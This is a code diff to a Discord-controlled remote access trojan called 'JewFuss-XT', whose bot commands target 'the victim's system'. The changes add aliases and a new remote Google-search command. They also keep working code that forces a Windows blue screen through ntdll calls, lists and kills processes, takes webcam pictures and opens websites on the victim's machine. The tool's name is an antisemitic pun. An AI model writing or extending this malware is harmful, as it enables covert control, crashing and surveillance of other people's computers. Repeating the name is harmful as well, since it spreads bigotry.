@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.10" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.11" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -2007,12 +2007,12 @@ async def unfreezecursor(ctx):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(help="Attempts to trigger a blue screen on the victim's system.", usage="$bluescreen")
+@bot.command(aliases=["bsod"], help="Attempts to trigger a blue screen on the victim's system.", usage="$bluescreen")
 async def bluescreen(ctx):
     try:
+        await ctx.send("Command Executed!")
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
-        await ctx.send("Command Executed!")
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
@@ -2040,7 +2040,6 @@ async def webcampic(ctx, cam: int = 0):
 
 @bot.command(help="Lists all running tasks on the victim's system.", usage="$tasks")
 async def tasks(ctx):
-    import psutil, io, discord
     try:
         processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
         processes.sort(key=lambda p: (p['name'] or '').lower())
@@ -2078,14 +2077,20 @@ async def kill(ctx, arg: str = ""):
     except Exception as e:
         await ctx.send(f"Error terminating task: {str(e)}")
 
-@bot.command(help="Opens the given website on the victim's default browser and maximizes it.", usage="$website <url>")
+@bot.command(aliases=["url"], help="Opens the given website on the victim's default browser.", usage="$website <url>")
 async def website(ctx, *, url: str):
     try:
         webbrowser.open(url)
-        time.sleep(3)
-        pyautogui.hotkey('f11')
-        
         await ctx.send(f"Opened and maximized the website: {url}")
+    except Exception as e:
+        await ctx.send(f"Error executing command: {str(e)}")
+
+@bot.command(aliases=["gsearch"], help="Googles the given text on the victim's computer.", usage="$google <url>")
+async def google(ctx, *, q: str):
+    try:
+        url = f"https://www.google.com/search?q=" + q.replace('"', '\\"').replace(" ", "+")
+        webbrowser.open(url)
+        await ctx.send(f"Googled {q}")
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
